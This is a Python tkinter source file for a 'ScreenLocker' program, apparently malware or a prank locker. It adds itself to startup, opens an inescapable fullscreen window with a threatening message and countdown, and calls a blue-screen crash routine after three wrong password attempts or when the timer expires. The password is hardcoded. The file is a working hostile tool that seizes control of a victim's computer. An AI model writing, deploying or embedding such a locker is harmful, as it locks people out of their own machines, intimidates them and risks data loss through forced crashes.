from tkinter import *
from tkinter import messagebox
from functools import partial
from modules import bsod, startup, uninstall
import os
import sys

# Initial setup
wind = Tk()
password = "123456"
lock_text = "Your computer has been locked!"
count = 3
countdown_time = 24 * 60  # 24 minutes in seconds (1440 seconds)

file_path = os.getcwd() + "\\" + os.path.basename(sys.argv[0])
startup(file_path)

# Button functions
def buton(arg):
    enter_pass.insert(END, arg)

def delbuton():
    enter_pass.delete(-1, END)

def tapp(key):
    pass

def check():
    global count
    if enter_pass.get() == password:
        messagebox.showinfo("ScreenLocker", "UNLOCKED SUCCESSFULLY")
        uninstall(wind)
    else:
        count -= 1
        if count == 0:
            messagebox.showwarning("ScreenLocker", "Number of attempts expired")
            bsod()
        else:
            messagebox.showwarning("ScreenLocker", f"Wrong password. Available tries: {count}")

def exiting():
    messagebox.showwarning("ScreenLocker", "THERE'S NO ESCAPE")

# Countdown timer
def update_timer():
    global countdown_time
    minutes = countdown_time // 60
    seconds = countdown_time % 60
    time_display.config(text=f"{minutes:02}:{seconds:02}")
    if countdown_time > 0:
        countdown_time -= 1
        wind.after(1000, update_timer)  # Update every second
    else:
        messagebox.showwarning("ScreenLocker", "TIME IS UP!")
        bsod()

# Window settings
wind.title("ScreenLocker")
wind["bg"] = "black"  # Dark background for horror effect
wind.attributes('-fullscreen', True)
wind.resizable(0, 0)
wind.protocol("WM_DELETE_WINDOW", exiting)

# Header and lock message
header_label = Label(wind, bg="black", fg="#ff0000", text="YOUR PC IS LOCKED", font="helvetica 30 bold", padx=10, pady=20)
header_label.pack(pady=10)

lock_message = Label(wind, bg="black", fg="white", text=lock_text, font="helvetica 25", pady=10)
lock_message.pack()

# Timer display
time_display = Label(wind, bg="black", fg="#ff0000", font="helvetica 40 bold")
time_display.pack(pady=20)
update_timer()

# Note area with horror theme
note_text = '''Your system has been locked due to suspicious activity.
Do not try to restart or remove this lock.
You are trapped here until the timer runs out...'''
note_label = Label(wind, text=note_text, fg="white", bg="black", font="helvetica 16", wraplength=700)
note_label.pack(pady=20)

# Password entry field
enter_pass = Entry(wind, bg="#202020", bd=10, fg="white", show='•', font="helvetica 25", width=10, justify="center")
enter_pass.pack(pady=10)

# Buttons layout
buttons_frame = Frame(wind, bg='black')
buttons_frame.pack(pady=20)

# Function to create buttons dynamically
def create_button(text, row, col):
    Button(buttons_frame, text=text, bg='#FF0000', fg='white', bd=5, height=2, width=5, font=('Helvetica', 14),
           command=partial(buton, text)).grid(row=row, column=col, padx=5, pady=5)

# Adding number buttons in a grid layout
for i in range(1, 10):
    create_button(str(i), (i-1)//3, (i-1)%3)
create_button("0", 3, 1)

# Delete and Unlock buttons
Button(buttons_frame, text="Delete", bg='#FF0000', fg='white', bd=5, height=2, width=5, font=('Helvetica', 14),
       command=delbuton).grid(row=3, column=0, padx=5, pady=5)
Button(buttons_frame, text="Unlock", bg='#FF0000', fg='white', bd=5, height=2, width=5, font=('Helvetica', 14),
       command=check).grid(row=3, column=2, padx=5, pady=5)

# Start the main loop
wind.mainloop()
